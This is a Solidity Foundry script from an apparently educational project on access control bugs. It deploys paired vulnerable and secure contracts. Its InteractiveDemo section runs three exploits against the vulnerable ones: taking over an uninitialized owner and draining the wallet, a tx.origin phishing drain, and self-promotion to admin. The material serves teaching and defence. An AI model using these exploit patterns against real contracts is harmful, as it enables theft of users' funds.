// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/solution/Project36Solution.sol";

/**
 * @title Deploy Project 36: Access Control Bugs
 * @notice Deployment script for access control demonstration contracts
 * @dev This deploys both vulnerable and secure versions for educational purposes
 */
contract DeployProject36 is Script {
    // Deployed contract addresses
    UninitializedWallet public uninitializedWallet;
    SecureWallet public secureWallet;
    MissingModifier public missingModifier;
    SecureModifiers public secureModifiers;
    TxOriginWallet public txOriginWallet;
    SecureMsgSenderWallet public secureMsgSenderWallet;
    VulnerableRoles public vulnerableRoles;
    SecureRoles public secureRoles;
    PublicInitializer public publicInitializer;
    SecureInitializer public secureInitializer;
    SecureUpgradeableInitializer public secureUpgradeableInitializer;
    UnprotectedDelegatecall public unprotectedDelegatecall;
    SecureDelegatecall public secureDelegatecall;
    VulnerableToken public vulnerableToken;
    SecureToken public secureToken;
    SecureAccessControl public secureAccessControl;
    SecureOwnable public secureOwnable;

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.addr(deployerPrivateKey);

        console.log("Deploying Project 36: Access Control Bugs");
        console.log("Deployer:", deployer);
        console.log("-------------------------------------------");

        vm.startBroadcast(deployerPrivateKey);

        // Deploy all vulnerable contracts
        deployVulnerableContracts();

        // Deploy all secure contracts
        deploySecureContracts();

        vm.stopBroadcast();

        // Log all deployed addresses
        logDeployedAddresses();
    }

    function deployVulnerableContracts() internal {
        console.log("\nDeploying VULNERABLE contracts...");

        uninitializedWallet = new UninitializedWallet();
        console.log("UninitializedWallet:", address(uninitializedWallet));

        missingModifier = new MissingModifier();
        console.log("MissingModifier:", address(missingModifier));

        txOriginWallet = new TxOriginWallet();
        console.log("TxOriginWallet:", address(txOriginWallet));

        vulnerableRoles = new VulnerableRoles();
        console.log("VulnerableRoles:", address(vulnerableRoles));

        publicInitializer = new PublicInitializer();
        console.log("PublicInitializer:", address(publicInitializer));

        unprotectedDelegatecall = new UnprotectedDelegatecall();
        console.log("UnprotectedDelegatecall:", address(unprotectedDelegatecall));

        vulnerableToken = new VulnerableToken(1000000 * 10**18);
        console.log("VulnerableToken:", address(vulnerableToken));
    }

    function deploySecureContracts() internal {
        console.log("\nDeploying SECURE contracts...");

        secureWallet = new SecureWallet();
        console.log("SecureWallet:", address(secureWallet));

        secureModifiers = new SecureModifiers();
        console.log("SecureModifiers:", address(secureModifiers));

        secureMsgSenderWallet = new SecureMsgSenderWallet();
        console.log("SecureMsgSenderWallet:", address(secureMsgSenderWallet));

        secureRoles = new SecureRoles();
        console.log("SecureRoles:", address(secureRoles));

        secureInitializer = new SecureInitializer();
        console.log("SecureInitializer:", address(secureInitializer));

        secureUpgradeableInitializer = new SecureUpgradeableInitializer();
        console.log("SecureUpgradeableInitializer:", address(secureUpgradeableInitializer));

        secureDelegatecall = new SecureDelegatecall();
        console.log("SecureDelegatecall:", address(secureDelegatecall));

        secureToken = new SecureToken(1000000 * 10**18);
        console.log("SecureToken:", address(secureToken));

        secureAccessControl = new SecureAccessControl();
        console.log("SecureAccessControl:", address(secureAccessControl));

        secureOwnable = new SecureOwnable();
        console.log("SecureOwnable:", address(secureOwnable));
    }

    function logDeployedAddresses() internal view {
        console.log("\n===========================================");
        console.log("DEPLOYMENT SUMMARY");
        console.log("===========================================");

        console.log("\nVULNERABLE CONTRACTS:");
        console.log("-------------------------------------------");
        console.log("UninitializedWallet:      ", address(uninitializedWallet));
        console.log("MissingModifier:          ", address(missingModifier));
        console.log("TxOriginWallet:           ", address(txOriginWallet));
        console.log("VulnerableRoles:          ", address(vulnerableRoles));
        console.log("PublicInitializer:        ", address(publicInitializer));
        console.log("UnprotectedDelegatecall:  ", address(unprotectedDelegatecall));
        console.log("VulnerableToken:          ", address(vulnerableToken));

        console.log("\nSECURE CONTRACTS:");
        console.log("-------------------------------------------");
        console.log("SecureWallet:             ", address(secureWallet));
        console.log("SecureModifiers:          ", address(secureModifiers));
        console.log("SecureMsgSenderWallet:    ", address(secureMsgSenderWallet));
        console.log("SecureRoles:              ", address(secureRoles));
        console.log("SecureInitializer:        ", address(secureInitializer));
        console.log("SecureUpgradeableInit:    ", address(secureUpgradeableInitializer));
        console.log("SecureDelegatecall:       ", address(secureDelegatecall));
        console.log("SecureToken:              ", address(secureToken));
        console.log("SecureAccessControl:      ", address(secureAccessControl));
        console.log("SecureOwnable:            ", address(secureOwnable));

        console.log("\n===========================================");
        console.log("WARNING: VULNERABLE CONTRACTS");
        console.log("===========================================");
        console.log("The vulnerable contracts contain intentional");
        console.log("security flaws for educational purposes.");
        console.log("DO NOT use them in production!");
        console.log("===========================================\n");
    }
}

/**
 * @title Deploy Vulnerable Only
 * @notice Script to deploy only vulnerable contracts for testing exploits
 */
contract DeployVulnerableOnly is Script {
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.addr(deployerPrivateKey);

        console.log("Deploying VULNERABLE contracts only");
        console.log("Deployer:", deployer);
        console.log("-------------------------------------------");

        vm.startBroadcast(deployerPrivateKey);

        UninitializedWallet uninitWallet = new UninitializedWallet();
        MissingModifier missingMod = new MissingModifier();
        TxOriginWallet txWallet = new TxOriginWallet();
        VulnerableRoles vulnRoles = new VulnerableRoles();
        PublicInitializer pubInit = new PublicInitializer();
        UnprotectedDelegatecall unprotectedDel = new UnprotectedDelegatecall();
        VulnerableToken vulnToken = new VulnerableToken(1000000 * 10**18);

        vm.stopBroadcast();

        console.log("\nDeployed addresses:");
        console.log("UninitializedWallet:     ", address(uninitWallet));
        console.log("MissingModifier:         ", address(missingMod));
        console.log("TxOriginWallet:          ", address(txWallet));
        console.log("VulnerableRoles:         ", address(vulnRoles));
        console.log("PublicInitializer:       ", address(pubInit));
        console.log("UnprotectedDelegatecall: ", address(unprotectedDel));
        console.log("VulnerableToken:         ", address(vulnToken));
    }
}

/**
 * @title Deploy Secure Only
 * @notice Script to deploy only secure contracts for production use
 */
contract DeploySecureOnly is Script {
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.addr(deployerPrivateKey);

        console.log("Deploying SECURE contracts only");
        console.log("Deployer:", deployer);
        console.log("-------------------------------------------");

        vm.startBroadcast(deployerPrivateKey);

        SecureWallet secWallet = new SecureWallet();
        SecureModifiers secMod = new SecureModifiers();
        SecureMsgSenderWallet secMsgWallet = new SecureMsgSenderWallet();
        SecureRoles secRoles = new SecureRoles();
        SecureInitializer secInit = new SecureInitializer();
        SecureUpgradeableInitializer secUpgInit = new SecureUpgradeableInitializer();
        SecureDelegatecall secDel = new SecureDelegatecall();
        SecureToken secToken = new SecureToken(1000000 * 10**18);
        SecureAccessControl secAccessCtrl = new SecureAccessControl();
        SecureOwnable secOwn = new SecureOwnable();

        vm.stopBroadcast();

        console.log("\nDeployed addresses:");
        console.log("SecureWallet:            ", address(secWallet));
        console.log("SecureModifiers:         ", address(secMod));
        console.log("SecureMsgSenderWallet:   ", address(secMsgWallet));
        console.log("SecureRoles:             ", address(secRoles));
        console.log("SecureInitializer:       ", address(secInit));
        console.log("SecureUpgradeableInit:   ", address(secUpgInit));
        console.log("SecureDelegatecall:      ", address(secDel));
        console.log("SecureToken:             ", address(secToken));
        console.log("SecureAccessControl:     ", address(secAccessCtrl));
        console.log("SecureOwnable:           ", address(secOwn));
    }
}

/**
 * @title Deploy and Fund
 * @notice Deploy contracts and fund them for testing
 */
contract DeployAndFund is Script {
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.addr(deployerPrivateKey);

        console.log("Deploying and funding contracts");
        console.log("Deployer:", deployer);
        console.log("-------------------------------------------");

        vm.startBroadcast(deployerPrivateKey);

        // Deploy vulnerable contracts
        UninitializedWallet uninitWallet = new UninitializedWallet();
        TxOriginWallet txWallet = new TxOriginWallet();
        MissingModifier missingMod = new MissingModifier();

        // Fund them
        payable(address(uninitWallet)).transfer(10 ether);
        payable(address(txWallet)).transfer(10 ether);
        payable(address(missingMod)).transfer(10 ether);

        console.log("\nFunded vulnerable contracts with 10 ETH each:");
        console.log("UninitializedWallet:", address(uninitWallet));
        console.log("TxOriginWallet:", address(txWallet));
        console.log("MissingModifier:", address(missingMod));

        vm.stopBroadcast();
    }
}

/**
 * @title Interactive Demo Script
 * @notice Demonstrates exploits in a controlled environment
 */
contract InteractiveDemo is Script {
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        uint256 attackerPrivateKey = vm.envUint("ATTACKER_PRIVATE_KEY");

        address deployer = vm.addr(deployerPrivateKey);
        address attacker = vm.addr(attackerPrivateKey);

        console.log("===========================================");
        console.log("ACCESS CONTROL BUGS - INTERACTIVE DEMO");
        console.log("===========================================");
        console.log("Deployer:", deployer);
        console.log("Attacker:", attacker);
        console.log("-------------------------------------------\n");

        // Demo 1: Uninitialized Owner
        demoUninitializedOwner(deployerPrivateKey, attackerPrivateKey);

        // Demo 2: tx.origin Phishing
        demoTxOriginPhishing(deployerPrivateKey, attackerPrivateKey);

        // Demo 3: Role Escalation
        demoRoleEscalation(deployerPrivateKey, attackerPrivateKey);
    }

    function demoUninitializedOwner(uint256 deployerKey, uint256 attackerKey) internal {
        console.log("DEMO 1: Uninitialized Owner Exploit");
        console.log("-------------------------------------------");

        vm.startBroadcast(deployerKey);
        UninitializedWallet wallet = new UninitializedWallet();
        payable(address(wallet)).transfer(5 ether);
        console.log("Deployed wallet with 5 ETH");
        console.log("Owner before attack:", wallet.owner());
        vm.stopBroadcast();

        vm.startBroadcast(attackerKey);
        wallet.setOwner(vm.addr(attackerKey));
        console.log("Attacker claimed ownership!");
        console.log("Owner after attack:", wallet.owner());

        wallet.withdraw();
        console.log("Attacker drained wallet!");
        console.log("Wallet balance:", address(wallet).balance);
        vm.stopBroadcast();

        console.log("-------------------------------------------\n");
    }

    function demoTxOriginPhishing(uint256 deployerKey, uint256 attackerKey) internal {
        console.log("DEMO 2: tx.origin Phishing Attack");
        console.log("-------------------------------------------");

        address deployer = vm.addr(deployerKey);
        address attacker = vm.addr(attackerKey);

        vm.startBroadcast(deployerKey);
        TxOriginWallet wallet = new TxOriginWallet();
        payable(address(wallet)).transfer(5 ether);
        console.log("Owner deployed wallet with 5 ETH");
        vm.stopBroadcast();

        vm.startBroadcast(attackerKey);
        TxOriginExploit phishing = new TxOriginExploit(wallet);
        console.log("Attacker deployed phishing contract");
        vm.stopBroadcast();

        vm.startBroadcast(deployerKey);
        console.log("Owner calls phishing contract (thinking it's safe)...");
        uint256 attackerBalBefore = attacker.balance;
        phishing.claimReward();
        console.log("Wallet drained! Attacker gained:", (attacker.balance - attackerBalBefore) / 1 ether, "ETH");
        vm.stopBroadcast();

        console.log("-------------------------------------------\n");
    }

    function demoRoleEscalation(uint256 deployerKey, uint256 attackerKey) internal {
        console.log("DEMO 3: Role Escalation Attack");
        console.log("-------------------------------------------");

        address attacker = vm.addr(attackerKey);

        vm.startBroadcast(deployerKey);
        VulnerableRoles roles = new VulnerableRoles();
        console.log("Deployed role-based contract");
        vm.stopBroadcast();

        vm.startBroadcast(attackerKey);
        console.log("Attacker is admin?", roles.admins(attacker));

        roles.addModerator(attacker);
        console.log("Attacker added self as moderator");

        roles.promoteToAdmin(attacker);
        console.log("Attacker promoted self to admin");

        console.log("Attacker is admin?", roles.admins(attacker));

        roles.criticalOperation();
        console.log("Attacker called admin-only function!");
        vm.stopBroadcast();

        console.log("-------------------------------------------\n");
    }
}
